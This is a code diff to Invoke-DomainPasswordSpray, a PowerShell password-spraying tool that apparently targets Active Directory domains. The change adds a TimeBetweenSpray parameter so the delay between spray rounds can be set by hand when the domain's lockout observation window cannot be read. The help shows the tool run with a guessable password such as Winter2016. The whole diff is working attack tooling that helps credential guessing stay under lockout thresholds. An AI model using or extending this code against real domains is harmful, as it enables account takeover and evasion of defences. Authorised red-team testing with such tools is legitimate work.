@@ -46,6 +46,10 @@ function Invoke-DomainPasswordSpray{
 
     For each user, will try that user's name as their password
 
+    .PARAMETER TimeBetweenSpray
+    
+    Amount of time between sprays ( default: automatic )
+
     .EXAMPLE
 
     C:\PS> Invoke-DomainPasswordSpray -Password Winter2016
@@ -109,7 +113,11 @@ function Invoke-DomainPasswordSpray{
      $Delay=0,
 
      [Parameter(Position = 9, Mandatory = $false)]
-     $Jitter=0
+     $Jitter=0,
+     
+     [Parameter(Position = 10, Mandatory = $false)]
+     [int]
+     $TimeBetweenSpray=0
 
     )
 
@@ -181,7 +189,16 @@ function Invoke-DomainPasswordSpray{
         Write-Host -ForegroundColor Yellow "[*] WARNING - Be very careful not to lock out accounts with the password list option!"
     }
 
-    $observation_window = Get-ObservationWindow $CurrentDomain
+    # If you can't look up the observation window, you can specify this parameter to override how many
+    #   minutes between sprays.
+    if ($TimeBetweenSpray)
+    {
+        $observation_window = $TimeBetweenSpray
+    }
+    else
+    {
+        $observation_window = Get-ObservationWindow
+    }
 
     Write-Host -ForegroundColor Yellow "[*] The domain password policy observation window is set to $observation_window minutes."
     Write-Host "[*] Setting a $observation_window minute wait in between sprays."
